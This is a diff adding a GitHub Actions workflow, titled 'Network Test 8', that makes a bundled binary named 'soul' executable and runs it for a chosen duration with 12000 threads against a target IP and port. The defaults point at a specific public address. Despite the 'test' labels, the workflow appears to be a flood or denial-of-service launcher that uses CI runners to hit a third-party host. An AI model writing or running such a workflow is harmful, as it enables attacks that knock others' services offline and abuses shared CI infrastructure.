@@ -1,0 +1,41 @@
+name: "Network Test 8"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: "Target IP"
+        required: true
+        default: "74.225.172.173"
+      target_port:
+        description: "Target Port"
+        required: true
+        default: "24055"
+      duration:
+        description: "Test Duration"
+        required: true
+        default: "120"
+
+jobs:
+  network-test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 7
+    
+    steps:
+    - name: "🔧 Setup Environment"
+      run: |
+        echo "Starting Network Test"
+        echo "Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
+        echo "Duration: ${{ inputs.duration }} seconds"
+        echo "Threads: 12000"
+        
+    - name: "📥 Setup Binary"
+      run: |
+        chmod +x soul
+        echo "✅ Binary ready"
+        
+    - name: "⚡ Execute Test"
+      run: |
+        echo "🚀 Starting network test..."
+        timeout ${{ inputs.duration }} ./soul "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.duration }}" "12000" || echo "Test completed"
+        echo "✅ Test finished"
